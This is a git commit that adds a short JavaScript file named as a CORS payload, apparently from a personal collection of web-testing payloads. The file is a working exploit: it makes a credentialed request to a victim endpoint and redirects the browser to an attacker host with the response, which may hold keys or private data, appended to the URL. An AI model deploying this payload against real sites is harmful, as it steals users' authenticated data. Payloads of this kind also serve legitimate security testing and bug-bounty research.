774669887a586df37b5e5a1b30dd652b6eb7043e
Nazeem Arif <f4rale@yandex.com>
2022-10-04 21:42:33 +0530

    cors payload 1

---
+++ cors/payload_1.js
@@ -0,0 +1,9 @@
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://victim.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//atttacker.net/log?key='+this.responseText; 
+};
